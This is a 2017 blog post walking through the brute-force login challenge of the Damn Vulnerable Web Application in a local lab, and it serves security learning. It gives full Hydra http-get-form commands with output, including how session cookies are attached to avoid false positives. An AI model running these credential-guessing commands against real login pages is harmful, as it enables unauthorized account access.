---
layout: post
title:  "DVWA Brute Force"
subtitle: "Damn Vulnerable Web Application"
date:   2017-02-18 12:00:00 -0500
author: "coastal"
header-img: "images/site-resources/dvwa-header.jpg"
---

After I took a bit of a break from the netsec stuff to work on a personal project, my [BitTorrent client](coast-client), I am back working on some practice apps again. This series I'm going to be focusing on the OWASP's Damn Vulnerable Web App (DVWA). The first challenge in the app is a brute force for a login page. Let's try a test request and intercept the traffic to see how the login functions:

```
GET /dvwa/vulnerabilities/brute/?username=test&password=test&Login=Login HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://192.168.56.101/dvwa/vulnerabilities/brute/?username=test&password=test&Login=Login
Cookie: security=low; JSESSIONID=C7D25AE3371371E9E3003D67F7FC0CB0; acopendivids=swingset,dvwa,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=4c0ndf5r1fgerkl58uo6kna4b1
Connection: close
Upgrade-Insecure-Requests: 1
```

Alright, so if we take a look at the ```GET``` request formatting we see that our username and password are just appended onto the ```http://192.168.56.101/dvwa/vulnerabilities/brute/```. 

```
GET /dvwa/vulnerabilities/brute/?username=test&password=test&Login=Login HTTP/1.1
```

As expected the request fails, but we learn the fail condition for the login from the response page.

<img src="{{ site.baseurl }}/images/dvwa/01_brute_force/brute-fail.jpg">


```
Username and/or password incorrect.
```

Let's make a wordlist for the user and admin profiles:

```
root@kali:~/Desktop# cat test-list.txt
user1
user2
user3
user
admin1
admin2
admin3
admin
```

Since we do already know the passwords for these profiles, this is more of an exercise in learning a new tool. For cracking this login we're going to use the Hydra tool. Since we've already written a number of brute-forcing scripts in python and understand how they work at a low-level, let's use Hydra to perform a more robust and 'professional' cracking experience. It is included by default in Kali distributions and has great functionality for network cracking. Taken from the [host site](hydra-link), it is clear that Hydra is a true multi-tool with capabilities to attack: ```telnet, ftp, http, https, smb, several databases, and much more```. Let's see if we can formulate a command for our login page to send it through the Hydra pipeline. 


```
root@kali:~/Desktop# hydra -l admin -P /root/Desktop/test-list.txt -o /root/Desktop/brute-attack.txt 192.168.56.101 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect."
Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-02-18 21:22:38
[DATA] max 8 tasks per 1 server, overall 64 tasks, 8 login tries (l:1/p:8), ~0 tries per task
[DATA] attacking service http-get-form on port 80
[80][http-get-form] host: 192.168.56.101   login: admin   password: user
[80][http-get-form] host: 192.168.56.101   login: admin   password: admin1
[80][http-get-form] host: 192.168.56.101   login: admin   password: admin2
[80][http-get-form] host: 192.168.56.101   login: admin   password: admin
[80][http-get-form] host: 192.168.56.101   login: admin   password: user1
[80][http-get-form] host: 192.168.56.101   login: admin   password: user2
[80][http-get-form] host: 192.168.56.101   login: admin   password: user3
[80][http-get-form] host: 192.168.56.101   login: admin   password: admin3
1 of 1 target successfully completed, 8 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-02-18 21:22:40

```

Hmm..well it looks like every one of our username/password requests is returning true. Let's think about any requests to the DVWA without authentication (which we have not included in our requests). If we try to request the brute-force page without a login ```http://192.168.56.101/dvwa/vulnerabilities/brute/```, we are redirected to the login page:

<img src="{{ site.baseurl }}/images/dvwa/01_brute_force/unauthenticated-login.jpg">

Aha! So since we are not authenticated when we make the login attempts, we are redirected to the login page which doesn't contain our false-result flag, and therefore is evaluated to a positive login. So let's attach some authentication to our Hydra attempts by taking authentication cookies from an intercepted request and appending it to the ```H=``` flag in our command:

```
root@kali:~/Desktop# hydra -l user -P /root/Desktop/test-list.txt -o /root/Desktop/brute-attack.txt 192.168.56.101 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=af2qff46iqe3c71vvn3l7tmde1"
Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-02-18 20:11:04
[DATA] max 8 tasks per 1 server, overall 64 tasks, 8 login tries (l:1/p:8), ~0 tries per task
[DATA] attacking service http-get-form on port 80
[80][http-get-form] host: 192.168.56.101   login: user   password: user
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-02-18 20:11:06
```

<img src="{{ site.baseurl }}/images/dvwa/01_brute_force/brute-success.jpg">

And we've got it! Hydra seems like a great tool, is quick, and has a wide variety of supported protocol attacks. I'll probably try to use it more frequently when attacking user/server login protocols.

[coast-client]:https://github.com/spencerdodd/coast
[hydra-link]:http://sectools.org/tool/hydra/